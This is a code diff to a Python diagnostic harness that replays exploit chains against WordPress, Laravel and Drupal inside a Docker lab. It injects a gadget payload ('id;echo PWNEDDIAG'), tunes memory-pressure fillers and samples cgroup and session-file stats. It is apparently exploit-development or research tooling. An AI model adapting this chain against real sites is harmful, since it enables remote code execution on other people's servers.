@@ -15,8 +15,8 @@ never touches any of it.
 
 usage: wp_diagnose.py [port] [container] [h] [chain]
 
-chain is "wordpress" (default) or "laravel"; the harness then
-reproduces that chain's exact attempt flow.
+chain is "wordpress" (default), "laravel" or "drupal"; the
+harness then reproduces that chain's exact attempt flow.
 """
 from __future__ import annotations
 
@@ -46,13 +46,14 @@ def main() -> int:
     # push h // 4 = 14MiB per filler into a 7MiB Content-Length
     # field - the extra bytes never become pressure and the
     # measurement lies.
-    if chain == "laravel":
-        lab.set_gadget("laravel", "id;echo PWNEDDIAG")
-        remote.ACTIVE_FILLERS = remote.N_FILLERS
-    else:
+    if chain == "wordpress":
         lab.set_gadget("wordpress", "id;echo PWNEDDIAG")
         lab.wp_align_geometry()
         remote.ACTIVE_FILLERS = 8
+    else:
+        # laravel and drupal use the bio geometry (raw body value)
+        lab.set_gadget(chain, "id;echo PWNEDDIAG")
+        remote.ACTIVE_FILLERS = remote.N_FILLERS
     remote.OUT_MARKER = "PWNEDDIAG"
 
     # one docker exec sampling everything inside the container
@@ -64,7 +65,10 @@ def main() -> int:
         "d=$(awk '/^dirty /{print $2}' /sys/fs/cgroup/memory.stat); "
         "e=$(awk '/^oom /{print $2}' /sys/fs/cgroup/memory.events); "
         "k=$(awk '/^oom_kill /{print $2}' /sys/fs/cgroup/memory.events); "
-        f"s=$(wc -c < /tmp/sess_{sid} 2>/dev/null || echo -1); "
+        # newest session file: chains with a fresh sid per attempt
+        # (filecache/laravel/drupal) do not use the sid below
+        "sf=$(ls -t /tmp/sess_* 2>/dev/null | head -1); "
+        "s=$( [ -n \"$sf\" ] && wc -c < \"$sf\" || echo -1 ); "
         "echo \"$c $f $a $d $e $k $s\"; "
         "sleep 0.02; i=$((i+1)); done"
     )
